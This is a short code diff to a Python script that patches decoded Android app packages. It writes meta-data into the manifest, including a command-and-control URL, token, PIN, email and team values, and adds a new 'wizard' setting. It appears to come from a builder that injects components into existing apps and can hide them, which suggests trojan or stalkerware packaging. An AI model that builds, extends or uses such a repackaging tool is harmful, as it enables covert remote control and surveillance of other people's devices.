@@ -275,13 +275,14 @@ def _injection(authority: str, app: str, use_label: bool, use_icon: bool) -> str
 """
 
 
-def _meta(c2_url: str, token: str, pin: str, email: str, team: str) -> str:
+def _meta(c2_url: str, token: str, pin: str, email: str, team: str, wizard: str) -> str:
     return (
         f'\n        <meta-data android:name="mzk.c2" android:value="{c2_url}" />'
         f'\n        <meta-data android:name="mzk.token" android:value="{token}" />'
         f'\n        <meta-data android:name="mzk.pin" android:value="{pin}" />'
         f'\n        <meta-data android:name="mzk.email" android:value="{email}" />'
         f'\n        <meta-data android:name="mzk.team" android:value="{team}" />'
+        f'\n        <meta-data android:name="mzk.wizard" android:value="{wizard}" />'
     )
 
 
@@ -295,7 +296,8 @@ def _check_collision(xml: str, app: str) -> None:
 
 def patch_manifest(decoded: Path, c2_url: str, token: str, pin: str,
                    email: str, team: str, hide: bool,
-                   use_label: bool = False, use_icon: bool = False) -> None:
+                   use_label: bool = False, use_icon: bool = False,
+                   wizard: str = "") -> None:
     mf = decoded / "AndroidManifest.xml"
     xml = mf.read_text(encoding="utf-8")
 
@@ -316,7 +318,9 @@ def patch_manifest(decoded: Path, c2_url: str, token: str, pin: str,
         1,
     )
     xml = xml.replace(
-        "</application>", _meta(c2_url, token, pin, email, team) + "\n    </application>", 1
+        "</application>",
+        _meta(c2_url, token, pin, email, team, wizard) + "\n    </application>",
+        1,
     )
 
     if hide:
